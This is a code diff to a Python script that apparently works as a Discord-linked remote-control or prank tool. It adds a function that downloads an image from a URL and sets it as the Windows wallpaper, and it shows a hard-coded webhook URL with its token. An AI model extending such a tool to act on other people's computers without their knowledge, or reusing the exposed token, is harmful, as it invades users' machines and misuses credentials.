@@ -7,6 +7,7 @@ import pip
 from threading import Thread
 from time import sleep
 from random import randint
+import ctypes
 
 webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQDm8-K4GQVXbz32C9NMj0ykOOxvmJz1bTXjeuMI0_bsHF15UJGSDMAuOgeO"
 
@@ -249,6 +250,19 @@ def playsound(url):
         log(f"Sucessfuly playsound({url})")
     except Exception as E:
         log(f"Error {E} while trying to playsound({url})")
+
+
+def set_background(image_url):
+    try:
+        filename = download_file(image_url)
+        path = os.getcwd()
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, path + "\\" + filename , 3)
+        log(f"Sucessfuly set_background({image_url})")
+    except Exception as E:
+        log(f"Error {E} while trying to set_background({image_url})")
+
+
+
 
 def set_varicelle_on_screen():
     try:
